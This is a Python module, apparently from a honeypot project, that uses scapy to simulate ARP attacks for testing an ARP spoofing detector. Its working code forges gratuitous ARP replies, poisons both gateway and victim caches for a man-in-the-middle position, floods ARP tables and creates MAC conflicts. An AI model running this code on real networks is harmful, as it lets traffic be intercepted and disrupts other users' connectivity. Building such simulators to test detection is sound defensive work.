"""
ARP Spoofing Attack Simulator
==============================

This module simulates ARP spoofing and poisoning attacks for testing the
ARP detector. Uses scapy to craft raw ARP packets.

Usage:
    python attack_simulator_arp.py
    
    Requires: Administrator/root privileges, scapy library
    
Educational Purpose:
    Demonstrates how ARP cache poisoning works at Layer 2.
    Shows man-in-the-middle attack techniques.
    
WARNING:
    Running ARP spoofing on a real network can disrupt connectivity!
    Use only in isolated test environments or on loopback interface.
"""

from scapy.all import ARP, Ether, send, sendp, get_if_hwaddr, conf
import time
import random
from datetime import datetime


class ARPSimulator:
    """
    Simulate ARP spoofing and poisoning attacks.
    
    Attack Types:
      - Gratuitous ARP: Unsolicited ARP broadcasts
      - ARP Poisoning: False IP-MAC mappings
      - ARP Flooding: Rapid ARP traffic
      - MAC Spoofing: Claim to be gateway/router
    """
    
    def __init__(self, interface=None):
        """
        Initialize ARP attack simulator.
        
        Args:
            interface: Network interface (None = default)
        """
        self.interface = interface or conf.iface
        self.my_mac = get_if_hwaddr(self.interface)
        print(f"[ARPSimulator] Interface: {self.interface}")
        print(f"[ARPSimulator] My MAC: {self.my_mac}")
        print("[ARPSimulator] Requires Administrator/root privileges")
        print("[ARPSimulator] WARNING: Use only in isolated test environment!")
    
    def gratuitous_arp(self, fake_ip="192.168.1.100", count=10):
        """
        Simulate gratuitous ARP broadcasts.
        
        Gratuitous ARP = Unsolicited ARP reply announcing IP-MAC mapping.
        Legitimate use: Announce IP address changes.
        Attack use: Poison ARP caches.
        
        Characteristics:
          - ARP reply with source IP = destination IP
          - Broadcast to all hosts
          - Updates ARP caches without request
        
        Args:
            fake_ip: IP address to claim
            count: Number of gratuitous ARP packets
        """
        print(f"\n[GRATUITOUS ARP] Sending {count} unsolicited ARP replies...")
        print(f"[GRATUITOUS ARP] Claiming IP {fake_ip} with MAC {self.my_mac}")
        start_time = time.time()
        
        for i in range(count):
            # Craft gratuitous ARP (op=2 is reply, psrc=pdst)
            arp_reply = ARP(
                op=2,  # ARP reply
                psrc=fake_ip,  # Source IP (fake)
                pdst=fake_ip,  # Destination IP (same = gratuitous)
                hwsrc=self.my_mac,  # Source MAC (our MAC)
                hwdst="ff:ff:ff:ff:ff:ff"  # Broadcast
            )
            
            # Broadcast on Layer 2
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether / arp_reply
            
            sendp(packet, iface=self.interface, verbose=False)
            time.sleep(random.uniform(0.5, 1.5))
        
        duration = time.time() - start_time
        rate = count / duration
        print(f"[GRATUITOUS ARP] Complete: {count} packets in {duration:.2f}s ({rate:.2f} pkt/s)")
    
    def arp_poisoning(self, target_ip="192.168.1.1", victim_ip="192.168.1.50", count=20):
        """
        Simulate ARP cache poisoning attack.
        
        Man-in-the-Middle attack:
          1. Tell victim that attacker's MAC is the gateway
          2. Tell gateway that attacker's MAC is the victim
          3. Intercept traffic between them
        
        Characteristics:
          - ARP replies claiming to be another host
          - Rapid updates to maintain poison
          - Bidirectional (poison both hosts)
        
        Args:
            target_ip: IP of gateway/router
            victim_ip: IP of victim host
            count: Number of poison packets
        """
        print(f"\n[ARP POISONING] Poisoning connection between {target_ip} <-> {victim_ip}")
        print(f"[ARP POISONING] Claiming to be both with MAC {self.my_mac}")
        start_time = time.time()
        
        for i in range(count):
            # Poison victim: "I am the gateway"
            arp_to_victim = ARP(
                op=2,  # ARP reply
                psrc=target_ip,  # Claim to be gateway
                pdst=victim_ip,  # Send to victim
                hwsrc=self.my_mac,  # With our MAC (spoofed!)
                hwdst="ff:ff:ff:ff:ff:ff"  # Broadcast
            )
            send(arp_to_victim, iface=self.interface, verbose=False)
            
            # Poison gateway: "I am the victim"
            arp_to_gateway = ARP(
                op=2,
                psrc=victim_ip,  # Claim to be victim
                pdst=target_ip,  # Send to gateway
                hwsrc=self.my_mac,
                hwdst="ff:ff:ff:ff:ff:ff"
            )
            send(arp_to_gateway, iface=self.interface, verbose=False)
            
            time.sleep(random.uniform(0.2, 0.5))
        
        duration = time.time() - start_time
        rate = (count * 2) / duration  # 2 packets per iteration
        print(f"[ARP POISONING] Complete: {count*2} packets in {duration:.2f}s ({rate:.2f} pkt/s)")
    
    def arp_flooding(self, count=50):
        """
        Simulate ARP flooding attack.
        
        Characteristics:
          - Rapid ARP traffic
          - Random IP-MAC mappings
          - Overwhelm ARP caches/tables
        
        Args:
            count: Number of ARP flood packets
        """
        print(f"\n[ARP FLOODING] Sending {count} rapid ARP packets...")
        start_time = time.time()
        
        for i in range(count):
            # Random IP and MAC
            random_ip = f"192.168.1.{random.randint(1, 254)}"
            random_mac = f"00:11:22:33:44:{i%256:02x}"
            
            arp_packet = ARP(
                op=2,  # ARP reply
                psrc=random_ip,
                pdst=random_ip,
                hwsrc=random_mac,
                hwdst="ff:ff:ff:ff:ff:ff"
            )
            
            send(arp_packet, iface=self.interface, verbose=False)
            time.sleep(0.02)  # Very fast
        
        duration = time.time() - start_time
        rate = count / duration
        print(f"[ARP FLOODING] Complete: {count} packets in {duration:.2f}s ({rate:.1f} pkt/s)")
    
    def mac_conflict(self, target_ip="192.168.1.100", count=15):
        """
        Simulate MAC address conflict.
        
        Multiple MACs claiming the same IP address.
        
        Characteristics:
          - Same IP from different MACs
          - Causes network confusion
        
        Args:
            target_ip: IP to cause conflict on
            count: Number of conflicting announcements
        """
        print(f"\n[MAC CONFLICT] Creating MAC conflict for IP {target_ip}")
        start_time = time.time()
        
        fake_macs = [
            "aa:bb:cc:dd:ee:01",
            "aa:bb:cc:dd:ee:02",
            "aa:bb:cc:dd:ee:03"
        ]
        
        for i in range(count):
            # Rotate through different MACs claiming same IP
            mac = fake_macs[i % len(fake_macs)]
            
            arp_packet = ARP(
                op=2,
                psrc=target_ip,  # Same IP
                pdst=target_ip,
                hwsrc=mac,  # Different MAC!
                hwdst="ff:ff:ff:ff:ff:ff"
            )
            
            send(arp_packet, iface=self.interface, verbose=False)
            time.sleep(random.uniform(0.3, 0.7))
        
        duration = time.time() - start_time
        print(f"[MAC CONFLICT] Complete: {count} packets in {duration:.2f}s")


def run_simulation_suite(interface=None, rounds=2):
    """
    Run a full suite of ARP attack simulations.
    
    Args:
        interface: Network interface (None = default)
        rounds: Number of times to run each attack type
    """
    print("=" * 70)
    print("ARP SPOOFING ATTACK SIMULATOR")
    print("=" * 70)
    print("WARNING: This sends ARP packets on your network!")
    print("Use only in isolated test environments!")
    print("=" * 70)
    print(f"Interface: {interface or conf.iface}")
    print(f"Rounds: {rounds} of each attack type")
    print(f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 70)
    
    try:
        simulator = ARPSimulator(interface)
        
        for round_num in range(1, rounds + 1):
            print(f"\n{'='*70}")
            print(f"ROUND {round_num}/{rounds}")
            print(f"{'='*70}")
            
            # Gratuitous ARP
            simulator.gratuitous_arp(fake_ip="192.168.1.99", count=8)
            time.sleep(3)
            
            # ARP Poisoning
            simulator.arp_poisoning(
                target_ip="192.168.1.1",
                victim_ip="192.168.1.50",
                count=12
            )
            time.sleep(3)
            
            # ARP Flooding
            simulator.arp_flooding(count=30)
            time.sleep(3)
            
            # MAC Conflict
            simulator.mac_conflict(target_ip="192.168.1.100", count=10)
            time.sleep(3)
        
        print(f"\n{'='*70}")
        print("SIMULATION COMPLETE")
        print(f"Finished: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("Check data/attack_logs.csv for logged ARP attacks")
        print(f"{'='*70}")
    
    except PermissionError:
        print("\nERROR: Permission denied!")
        print("ARP spoofing requires Administrator/root privileges")
        print("Windows: Run as Administrator")
        print("Linux: Use sudo")
    except Exception as e:
        print(f"\nERROR: {e}")


if __name__ == "__main__":
    import argparse
    import sys
    
    parser = argparse.ArgumentParser(description="ARP Spoofing Attack Simulator")
    parser.add_argument("--interface", default=None, help="Network interface (default: system default)")
    parser.add_argument("--rounds", type=int, default=2, help="Number of rounds (default: 2)")
    parser.add_argument("--auto", action="store_true", help="Auto-start without prompt")
    args = parser.parse_args()
    
    print("\n" + "="*70)
    print("IMPORTANT: RUN THE ARP DETECTOR FIRST!")
    print("  python honeypot/arp_spoof_detector.py")
    print("\nOr use honeypot_manager.py to run all detectors together.")
    print("="*70 + "\n")
    
    if not args.auto:
        print("This simulator will send ARP packets on your network.")
        print("Ensure you are on an isolated test network or use loopback.")

        response = input("\nContinue? (yes/no): ")
        if response.lower() != 'yes':
            print("Aborted.")
            sys.exit(0)

    run_simulation_suite(interface=args.interface, rounds=args.rounds)
